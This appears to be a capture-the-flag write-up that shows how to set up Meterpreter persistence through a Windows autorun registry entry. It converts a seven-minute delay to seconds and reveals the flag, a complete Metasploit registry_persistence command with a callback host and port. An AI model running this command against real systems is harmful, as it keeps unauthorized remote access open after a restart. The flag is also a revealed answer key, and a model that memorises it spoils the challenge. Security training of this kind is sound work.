# Persistence

> **Challenge:** Configure Meterpreter persistence through a Windows autorun registry entry so a session can be re-established after the system restarts.

---

## Challenge Details

The persistence configuration must use the following values:

| Setting | Required value |
|:--|:--|
| Delay after restart | **7 minutes** |
| Local listening port | `1337` |
| Local host IP | `192.168.0.177` |

The submitted answer must be a single Metasploit command matching the challenge's specified format.

## Solution

The challenge uses the `exploit/windows/local/registry_persistence` module. Its timing option is expressed in **seconds**, so the requested seven-minute interval needs to be converted:

```text
7 minutes × 60 seconds = 420 seconds
```

The command then combines the module name with the required sleep interval, listening port, and local host address.

## 🚩 Flag

<details>
<summary><strong>Reveal Answer</strong></summary>

```text
run exploit/windows/local/registry_persistence SLEEP_TIME=420 LPORT=1337 LHOST=192.168.0.177
```

</details>
